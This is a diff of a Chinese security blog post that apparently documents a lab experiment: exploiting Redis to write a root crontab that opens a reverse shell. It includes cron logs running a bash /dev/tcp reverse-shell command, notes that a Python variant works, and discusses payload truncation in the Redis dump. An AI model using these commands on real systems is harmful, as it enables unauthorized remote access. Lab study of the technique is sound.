@@ -235,9 +235,7 @@ Jul 18 19:30:01 mint-VirtualBox CRON[2868]: (CRON) info (No MTA installed, disca
 Jul 18 19:31:01 mint-VirtualBox CRON[2881]: (root) CMD (bash -i >& /dev/tcp/192.168.0.106/2333 0>&1)
 Jul 18 19:31:01 mint-VirtualBox CRON[2880]: (CRON) info (No MTA installed, discarding output)
 ```
-"No MTA installed, discarding output"网上有很多解法，解法1是安装邮件服务器；解法2是把shell命令放到一个文件中，执行该文件，然后重定向到null文件。官方解法见链接
-
-https://cronitor.io/cron-reference/no-mta-installed-discarding-output
+"No MTA installed, discarding output"网上有很多解法，解法1是安装邮件服务器；解法2是把shell命令放到一个文件中，执行该文件，然后重定向到null文件。官方解法见链接https://cronitor.io/cron-reference/no-mta-installed-discarding-output
 
 值得注意的是，官方里面说这个错误不会影响任务本身的执行，但是为什么依然没有反弹shell呢，我们试着用其中一种解法`MAILTO=""`来解决该错误，然后观察日志，
 
@@ -249,11 +247,7 @@ Jul 18 19:39:01 mint-VirtualBox CRON[2975]: (root) CMD (bash -i >& /dev/tcp/192.
 ```
 果然没再报错，但是依旧没有反弹shell，是不是反弹shell命令写错了？我们尝试直接执行是没有问题的，
 ![/data/typora_assets/redis/20200718194424795.png](https://i.loli.net/2020/07/24/BLlkCrbD8aujJvV.png)
-后来发现这篇文章，
-
-https://www.onebug.org/websafe/98675.html
-
-里面提到“bash -i反弹shell都失败，不过python，perl可以”，换成python的试一下，确实可以，
+后来发现这篇文章，https://www.onebug.org/websafe/98675.html 里面提到“bash -i反弹shell都失败，不过python，perl可以”，换成python的试一下，确实可以，
 ![/data/typora_assets/redis/20200718200550210.png](https://i.loli.net/2020/07/24/YViLD2kGw1CsZoA.png)
 我们使用python反弹shell试一下ubuntu是否真的会受格式影响，
 
@@ -280,7 +274,7 @@ redis-bitsÀ@ú^EctimeÂ}æ^R_ú^Hused-memÂ¨Ó^L^@ú^Laof-preambleÀ^@þ^@û^A
 ```
 16进制查看，
 ![/data/typora_assets/redis/20200718214546791.png](https://i.loli.net/2020/07/24/Vzei6OFRBC8aSGX.png)
-按照https://lorexxar.cn/2016/12/03/redis-getshell/  这篇文章所讲好像发生了截断？但是具体怎么个截断法，没搞明白，是否可能构造出完美payload有待研究？如果写入字符比较少就不会发生截断，例如，
+按照https://lorexxar.cn/2016/12/03/redis-getshell/ 这篇文章所讲好像发生了截断？但是具体怎么个截断法，没搞明白，是否可能构造出完美payload有待研究？如果写入字符比较少就不会发生截断，例如，
 ![/data/typora_assets/redis/20200718220052178.png](https://i.loli.net/2020/07/24/3TlSW2YkRxQreUf.png)
 最后我们尝试一下，如果不发生截断的情况下写到`/var/spool/cron/crontabs/root`文件，能否反弹shell，我们手动更改`/var/spool/cron/crontabs/root`文件内容如下，
 
